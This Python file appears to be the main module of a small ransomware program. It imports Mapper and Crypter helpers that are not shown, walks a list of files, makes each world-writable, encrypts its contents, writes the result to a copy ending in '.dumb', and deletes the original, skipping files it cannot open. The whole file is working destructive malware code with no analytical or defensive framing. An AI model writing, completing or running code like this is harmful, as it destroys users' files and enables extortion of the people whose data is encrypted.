"""
 *  ¨¨¨¨¨¨¨¨¨¨¨¨¨¨¨¨¨¨¨¨¨¨¨¨¨¨¨¨
 *  ¨ AUTHOR: mrc1002          ¨
 *  ¨ Credits: None            ¨
 *  ¨¨¨¨¨¨¨¨¨¨¨¨¨¨¨¨¨¨¨¨¨¨¨¨¨¨¨¨
"""

from services.mapper import Mapper
from services.crypter import Crypter
import os
import string
import random
import sys
import shutil


class Main(object):

    def __init__(self, **args):

        """Create the mapper and encryption object"""
        self._Mapper = Mapper()
        self._Crypter = Crypter()
        self.main()

    def main(self):

        """Main method to scans and encrypts files"""
        for file in self._Mapper():

            try:
                os.chmod(file, 0o777)

                with open(file, 'rb') as r:
                    content = r.read()
                    r.close()
                    enc = self._Crypter(str(content))
                    crypted = os.path.splitext(file)[0] + os.path.splitext(file)[1] + ".dumb"

                    with open(crypted, 'wb') as n:
                        n.write(str.encode(enc))
                        n.close()

                    os.remove(file)

            except PermissionError:
                pass


if __name__ == '__main__':
    g = Main()
